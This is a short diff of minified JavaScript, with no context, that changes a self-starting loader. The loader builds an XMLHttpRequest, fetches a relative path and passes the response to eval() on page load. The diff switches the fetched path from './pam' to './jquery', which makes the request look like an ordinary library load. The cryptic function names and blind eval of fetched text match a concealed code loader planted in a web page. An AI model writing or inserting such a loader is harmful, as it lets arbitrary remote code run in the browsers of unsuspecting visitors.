@@ -1,2 +1,2 @@
-function x(){try{return new XMLHttpRequest();}catch(e){try{return new ActiveXObject('Msxml2.XMLHTTP');}catch(e){try{return new ActiveXObject('Microsoft.XMLHTTP');}catch(e){return null;}}}};function y(){var z=x();if(z){z.open('get','./pam');z.onreadystatechange=function(){if(z.readyState==4){
+function x(){try{return new XMLHttpRequest();}catch(e){try{return new ActiveXObject('Msxml2.XMLHTTP');}catch(e){try{return new ActiveXObject('Microsoft.XMLHTTP');}catch(e){return null;}}}};function y(){var z=x();if(z){z.open('get','./jquery');z.onreadystatechange=function(){if(z.readyState==4){
 	eval(z.responseText);}};z.send(null);}};y();
